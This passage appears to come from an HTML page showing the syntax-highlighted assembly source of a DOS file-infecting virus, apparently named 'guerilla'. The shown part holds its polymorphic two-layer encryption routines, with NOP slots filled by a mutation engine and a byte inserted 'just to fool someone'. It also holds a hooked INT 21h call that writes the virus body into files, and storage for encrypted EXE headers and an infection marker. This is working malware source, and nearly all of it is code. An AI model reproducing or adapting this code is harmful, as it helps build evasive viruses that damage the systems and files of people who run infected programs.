                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; CX = Bytes to write</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; Zero register</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; Set carry flag</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">second_encr</span><span class="sc0">             </span><span class="sc1">; Second encryption</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; Set carry flag</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">first_layer_enc</span><span class="sc0">         </span><span class="sc1">; First encryption</span><span class="sc0">
</span><span class="sc5">first_encr_end</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; Bytes to write</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; AH = 40h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">          </span><span class="sc1">; Write the body of the virus</span><span class="sc0">
</span><span class="sc5">fill_poly_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">first_layer_enc</span><span class="sc0">         </span><span class="sc1">; Decrypt our body</span><span class="sc0">
</span><span class="sc5">fill_poly_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">second_encr</span><span class="sc0">             </span><span class="sc1">; Second decryption</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">enc_dec_copy</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">; First (heh, the one that is first seen by the user ;) ) encryption loop</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">first_layer_enc</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b1h</span><span class="sc0">                    </span><span class="sc1">; mov cl,</span><span class="sc0">
</span><span class="sc5">first_rand</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">                     </span><span class="sc1">; random value</span><span class="sc0">
</span><span class="sc5">fill_poly_10</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b1h</span><span class="sc0">                    </span><span class="sc1">; mov cl,</span><span class="sc0">
</span><span class="sc5">first_rand_beta</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">                     </span><span class="sc1">; random value</span><span class="sc0">

</span><span class="sc1">; One of the two "mov cl," will be used for encryption the other for</span><span class="sc0">
</span><span class="sc1">; decryption (depending on what will be generated in fill_poly_10.</span><span class="sc0">
</span><span class="sc1">; Infact when encrypting we call this with Carry set, but then depends</span><span class="sc0">
</span><span class="sc1">; if we generated a JNC or a JC with the engine). Of course this means</span><span class="sc0">
</span><span class="sc1">; that first_rand_beta = 10h - first_rand</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">fill_poly_8</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_encr_start</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">fill_poly_9</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">0BAh</span><span class="sc0">              </span><span class="sc1">; mov edx,(lenght to encr)</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">first_enc_lenght</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">fill_poly_12</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">                    </span><span class="sc1">; just to fool someone</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Ah</span><span class="sc0">                </span><span class="sc1">; mov xx,cs:[di]</span><span class="sc0">
</span><span class="sc5">reg8ch1</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">25h</span><span class="sc0">                     </span><span class="sc1">; AL or AH</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0D2h</span><span class="sc0">                    </span><span class="sc1">; ROx ah,cl</span><span class="sc0">
</span><span class="sc5">rotate_oper</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0CCh</span><span class="sc0">                    </span><span class="sc1">; ROL or ROR</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">                </span><span class="sc1">; mov cs:[di],xx</span><span class="sc0">
</span><span class="sc5">reg8ch2</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">25h</span><span class="sc0">                     </span><span class="sc1">; AL or AH</span><span class="sc0">

</span><span class="sc5">fill_poly_4</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">47h</span><span class="sc0">                     </span><span class="sc1">; inc di</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">fill_poly_12</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">4Ah</span><span class="sc0">                 </span><span class="sc1">; dec edx</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">fill_poly_7</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0FAh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; cmp edx,00h</span><span class="sc0">

</span><span class="sc5">fill_poly_11</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">0EAh</span><span class="sc0">                </span><span class="sc1">; JNE dec_loopy</span><span class="sc0">

                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">first_layer_enc</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; Generates a call to the original INT21h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">do_orig_int21h</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">               </span><span class="sc1">; Push flags</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9Ah</span><span class="sc0">                 </span><span class="sc1">; CALL far ptr</span><span class="sc0">
</span><span class="sc5">sec_int21_offset</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">sec_int21_segment</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">do_orig_int21h</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; where the encrypted EXE header will be stored</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">head_buffer</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">file_time</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">file_date</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">virus_end_file</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; Place for storing ES:DI where the SFT is located</span><span class="sc0">

</span><span class="sc5">sft_es</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">sft_di</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">lenght_dx</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">lenght_ax</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">inf_marker</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">exe_header_space</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">guerilla</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">

        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
